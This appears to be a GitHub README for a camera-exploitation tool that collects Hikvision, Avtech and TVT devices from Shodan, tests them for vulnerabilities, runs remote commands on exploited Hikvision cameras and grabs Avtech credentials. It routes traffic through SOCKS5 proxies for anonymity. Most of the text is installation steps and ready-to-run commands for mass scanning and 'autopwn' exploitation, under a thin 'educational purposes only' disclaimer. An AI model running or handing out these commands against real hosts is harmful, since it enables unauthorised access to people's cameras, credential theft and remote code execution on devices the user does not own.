## Internet Camera Exploitation Tool

This is a tool meant to assist cyber security researchers on discovering outdated and vulnerable camera systems on the internet by utilizing shodan.io

![](/screenshots/Screenshot_20221216_015844.png)

![](/screenshots/Screenshot_20221216_021346.png)

## Vendors Affected

[+] Hikvision
[+] Avtech
[+] TVT

more to come...

## Features

- Fetching of hosts from shodan.io
- Check for vulnerable cameras
- Automatically run commands on exploited devices (Only Hikvision for now)
- Automatically grab camera credentials (Only for Avtech)
- Multi-threading for faster scanning
- Usage of Socks5 proxies for anonymity
- Storing results in Sqlite3 database
- Logging all actions in log files 

## Prerequisites

To use this tool you need to have the following:
- Shodan API key (Membership required for more than 1 page)
- Socks5 authenticated proxies

## Installation

```
git clone https://github.com/TasosY2K/camera-exploits
pip install -r requirements.txt
python3 scanner.py --help
```

## Usage

##### Collect hosts in database

```
# Collect Hikvision hosts
python3 scanner.py --shodan --api-token <shodan_token> --query 'product:"Hikvision IP Camera"' --pages 1

# Collect Avtech hosts
python3 scanner.py --shodan --api-token <shodan_token> --query 'linux upnp avtech' --pages 1

# Collect TVT hosts
python3 scanner.py --shodan --api-token <shodan_token> --query 'product:"Cross Web Server"' --pages 1
```

##### Check hosts for exploit

```
python3 scanner.py --check --proxy-file proxies.txt --threads 20
```

##### Automatically run command on exploited hosts

```
python3 scanner.py --autopwn --proxy-file proxies.txt --payload "id"
```

## About this tool

This pure is purely educational and is inteded to make the internet more secure

**I will not be responsible for any direct or indirect damage caused due to the usage of this tool, it is for educational purposes only.**

Any PR's or suggestions on improving this project are welcome

## For more features consider donating
ETH - 0xf3C6A668A24bd350630fF7eA3678Fa2B191Eb595